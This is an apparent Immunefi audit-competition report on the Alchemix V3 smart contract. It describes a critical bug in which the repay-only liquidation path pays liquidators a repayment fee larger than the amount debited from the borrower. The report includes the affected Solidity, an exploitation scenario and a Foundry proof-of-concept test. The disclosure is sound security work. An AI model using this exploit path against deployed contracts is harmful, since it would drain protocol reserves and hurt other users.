# 58626 sc critical repayment fee overpayment in liquidation repay only path

**Submitted on Nov 3rd 2025 at 17:34:21 UTC by @jayx for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58626
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `_liquidate()` function's repay-only liquidation path contains a critical vulnerability where the repayment fee transferred to the liquidator exceeds the fee actually debited from the borrower's collateral. Specifically, `_resolveRepaymentFee()` deducts \min(fee, collateral) from the position but returns the full nominal fee, which is then transferred unconditionally to the liquidator. This creates a direct theft vector where liquidators systematically receive unearned tokens from the protocol's reserves, resulting in protocol insolvency over time as repeated liquidations compound losses.

## Vulnerability Details

### Root Cause

The vulnerability exists in the asymmetric handling of repayment fees between the account deduction and liquidator payment:

**In `_resolveRepaymentFee()`:**

```solidity
fee = repaidAmountInYield * repaymentFee / BPS;
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;  // Returns FULL nominal fee, not the capped amount
```

**In `_liquidate()` repay-only path:**

```solidity
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // Transfers full fee WITHOUT guard
```

### The Mismatch

The critical issue is that:

1. **Account deduction**: Only \min(fee, collateral) is removed from the position
2. **Fee return**: The function returns the full nominal fee
3. **Liquidator payment**: The full nominal fee is transferred to the liquidator **without verification**

This violates the protocol's own directive: "the fee should only come from account collateral, otherwise only the debited amount should be transferred."

### Code Asymmetry

**Repay-only path** (vulnerable):

```solidity
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // ❌ NO GUARD
```

**Partial liquidation path** (protected):

```solidity
if (feeInYield > 0 && account.collateralBalance >= feeInYield)  // ✓ HAS GUARD
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
```

### Exploitation Scenario

1. Borrower has 100 MYT collateral and 80 MYT debt
2. Earmarked debt (60 MYT) is created via Transmuter
3. Price crash makes position undercollateralized
4. Repayment fee is configured at 100% (10,000 BPS)
5. Liquidation is triggered:
   * `_forceRepay` repays 60 MYT debt to Transmuter
   * `_resolveRepaymentFee` calculates: fee = 60 \*10000/10000 = 60 MYT
   * Account collateral decreases by: min(60, 100) = 60 MYT
   * But liquidator receives: **60 MYT** (the full nominal fee)
   * Result: Liquidator gets paid correctly, but ONLY because collateral was sufficient
6. **Critical case** - Lower collateral scenario:
   * Same setup but borrower only has 20 MYT collateral
   * Fee calculation: 60 MYT
   * Account deduction: min(60, 20) = 20 MYT
   * Liquidator receives: **60 MYT**
   * Overpayment: **40 MYT** comes from protocol reserves

## Impact Details

### Direct Financial Impact

**Per-Liquidation Loss:**

* If nominalFee > min(nominalFee, collateralBalance), the protocol loses tokens
* Overpayment per liquidation: max(0, nominalFee - collateralBalance)

**Cumulative Loss:**

* Each undercollateralized liquidation triggers the overpayment
* With sustained market volatility and active liquidations, cumulative losses scale linearly with liquidation volume
* Example: 1,000 liquidations × 50 MYT average overpayment = 50,000 MYT lost

### Affected Parties

1. **Protocol**: Suffers direct token depletion from reserves
2. **Legitimate liquidators**: Indirectly benefit if they liquidate undercollateralized positions (though this is not their fault)
3. **Other borrowers**: Protocol insolvency from cumulative losses could prevent collateral withdrawals or protocol operations

### Attack Complexity

**Low**: The vulnerability requires:

1. A position with earmarked debt (automatic via Transmuter)
2. Market conditions that cause undercollateralization (happens naturally)
3. Calling the public `liquidate()` function (no special access needed)

An attacker could trigger this repeatedly by:

* Creating multiple positions with earmarked debt
* Monitoring for price drops that cause undercollateralization
* Calling `liquidate()` to extract overpaid fees

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900C3-L907C6>

## Proof of Concept

## Proof of Concept

```solidity
function test_Liquidate_RepayOnly_Overpays_Fee() external {
    // Admin tuning for deterministic thresholds and isolation of the repayment fee effect
    vm.startPrank(alOwner);
    alchemist.setProtocolFee(0);                           // isolate repayment fee vs actual debit
    alchemist.setMinimumCollateralization(1_500e15);       // 150%
    alchemist.setCollateralizationLowerBound(1_490e15);    // 149% (must be <= minimum)
    alchemist.setRepaymentFee(10_000);                     // 100% fee => nominal fee = repaidAmountInYield
    vm.stopPrank();

    // Borrower deposits and mints near the limit (≈98% of max) so pre-repay is unhealthy post-shock
    address borrower = externalUser;
    uint256 depositAmt = 100_000e18;

    vm.startPrank(borrower);
    deal(address(vault), borrower, depositAmt);
    IERC20(address(vault)).approve(address(alchemist), depositAmt);
    alchemist.deposit(depositAmt, borrower, 0);
    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(borrower, address(alchemistNFT));

    uint256 maxDebt = alchemist.getMaxBorrowable(tokenId);
    uint256 mintedDebt = (maxDebt * 98) / 100;
    alchemist.mint(tokenId, mintedDebt, borrower);
    vm.stopPrank();

    // Earmark all debt via Transmuter redemption (no claim)
    uint256 redeemAmt = alchemist.totalSyntheticsIssued();
    vm.startPrank(address(0xdad));
    IERC20(alToken).approve(address(transmuterLogic), redeemAmt);
    transmuterLogic.createRedemption(redeemAmt);
    vm.stopPrank();

    // Let earmarks mature
    vm.roll(block.number + 5_256_000);

    // Apply a moderate price shock so pre-repay is liquidatable
    uint256 ts = IERC20(address(mockStrategyYieldToken)).totalSupply();
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply((ts * 13) / 10); // ~23% price drop

    // Pre-fund the Alchemist so it can pay the nominal repayment fee after force-repay
    // (without this, transfer to liquidator can underflow due to prior force-repay outflow)
    deal(address(vault), address(alchemist), 200_000e18);

    // Snapshots
    (uint256 preColl,,) = alchemist.getCDP(tokenId);
    uint256 transPre = IERC20(address(vault)).balanceOf(address(transmuterLogic));
    uint256 liqPre   = IERC20(address(vault)).balanceOf(yetAnotherExternalUser);

    // Liquidate -> expect repay-only path
    vm.prank(yetAnotherExternalUser);
    (uint256 yieldAmount, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId);

    // Repay-only invariants:
    // - yieldAmount is the repaidAmountInYield from earmarks
    // - assets seizure == 0 in this path; the function returns yieldAmount in slot 0
    // - no underlying fee; fee is payable in MYT only
    assertGt(yieldAmount, 0, "repay-only must repay earmarked debt");
    assertEq(feeInUnderlying, 0, "repay-only must not pay underlying fee");
    assertGt(feeInYield, 0, "repay-only must pay a MYT fee");

    // Post-state snapshots
    (uint256 postColl,,) = alchemist.getCDP(tokenId);
    uint256 transPost = IERC20(address(vault)).balanceOf(address(transmuterLogic));
    uint256 liqPost   = IERC20(address(vault)).balanceOf(yetAnotherExternalUser);

    // The Transmuter receives the repaidAmountInYield during _forceRepay
    uint256 repaidYield = transPost - transPre;
    assertEq(yieldAmount, repaidYield, "yieldAmount must equal repaidAmountInYield");

    // Liquidator receives the nominal fee amount computed by _resolveRepaymentFee
    assertEq(liqPost - liqPre, feeInYield, "liquidator must receive nominal repayment fee");

    // With protocolFee = 0, position collateral loss = repaidYield + actual fee debited
    // Compute the fee amount actually debited from the account’s collateral
    uint256 collateralLoss = preColl - postColl;
    uint256 actualFeeDebited = collateralLoss > repaidYield ? (collateralLoss - repaidYield) : 0;

    // BUG: nominal fee transferred > fee actually debited (deduction is min(fee, collateralBalance))
    assertGt(feeInYield, actualFeeDebited, "nominal fee paid should exceed fee actually debited");
}

```
